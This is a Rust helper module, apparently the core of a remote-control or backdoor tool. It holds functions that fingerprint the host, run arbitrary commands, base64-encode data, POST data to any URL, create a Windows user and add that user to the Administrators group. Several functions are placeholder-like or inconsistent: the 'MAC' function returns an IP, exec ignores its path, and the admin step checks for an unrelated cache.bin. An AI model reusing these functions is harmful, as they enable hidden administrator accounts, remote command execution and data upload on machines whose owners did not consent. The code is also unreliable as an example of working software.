// mod core; // Removed as the module file is missing and not required


use std::{any::Any, path::PathBuf};
use base64;

// use crate::lib; // Removed as `lib` module does not exist




type Regex = String;

// 获取程序pid

// Add your existing code here

// Add your core module functions here

use std::net::UdpSocket;

pub fn get_mac_address() -> Option<String> {
    // Placeholder implementation for getting MAC address
    // Replace with actual logic as needed
    let socket = UdpSocket::bind("0.0.0.0:0").ok()?;
    socket.connect("8.8.8.8:80").ok()?;
    let local_addr = socket.local_addr().ok()?;
    Some(format!("MAC-PLACEHOLDER-{}", local_addr.ip()))
}

pub fn get_ip() -> Option<String> {
    // Example implementation to get the local IP address
    use std::net::UdpSocket;
    let socket = UdpSocket::bind("0.0.0.0:0").ok()?;
    socket.connect("8.8.8.8:80").ok()?;
    socket.local_addr().ok().map(|addr| addr.ip().to_string())
}

pub fn str(item:&dyn Any) -> String {
    return format!("{:?}", item);
}

pub fn wait(_time:i32) {
    std::thread::sleep(std::time::Duration::from_secs(_time as u64));
}

// 获取dirname， 类似于python的os.path.dirname

pub fn dirname(path:&str) -> String {
    let pos = path.rfind('\\').map_or(0, |i| i + 1);
    path[..pos].to_string()
}

// Add this function to the core module
pub fn encrypt(input: &str) -> String {
    base64::encode(input) // Example encryption using Base64 encoding
}
pub fn exec(object: &str, command: &[&str], path: String) -> String {
    let path = if path.is_empty() { "./".to_string() } else { path };
    let mut cmd = std::process::Command::new(object);
    for arg in command {
        cmd.arg(arg);
    }
    let output = cmd.output().map_err(|e| e.to_string()).unwrap();
    String::from_utf8(output.stdout).unwrap()
}
pub fn say(_msg: &str) {
    println!("{}", _msg);
}

pub fn upload(_url: &str, s: &str) -> String {
    // Placeholder implementation for file upload
    // Replace with actual logic as needed
    // 连接到服务
    let client = reqwest::blocking::Client::new();
    let response = client.post(_url).body(s.to_string()).send().unwrap();
    return response.text().unwrap()
}

pub fn add_user(_name: &str, _password: &str) -> String {
    // Placeholder implementation for adding a user
    // Replace with actual logic as needed
    let output = std::process::Command::new("net")
        .arg("user")
        .arg("/add")
        .arg(_name)
        .arg(_password)
        .output()
        .expect("Failed to execute command");
    String::from_utf8_lossy(&output.stdout).to_string()
}

pub fn set_user_admin(_name: &str) -> String {
    // Placeholder implementation for setting user as admin
    // Replace with actual logic as needed
    let output = std::process::Command::new("net")
        .arg("localgroup")
        .arg("Administrators")
        .arg("/add")
        .arg(_name)
        .output()
        .expect("Failed to execute command");
    let cache_path = PathBuf::from("cache.bin");
    if !cache_path.exists() {
        return "Error: cache.bin not found".to_string();
    }
    String::from_utf8_lossy(&output.stdout).to_string()
}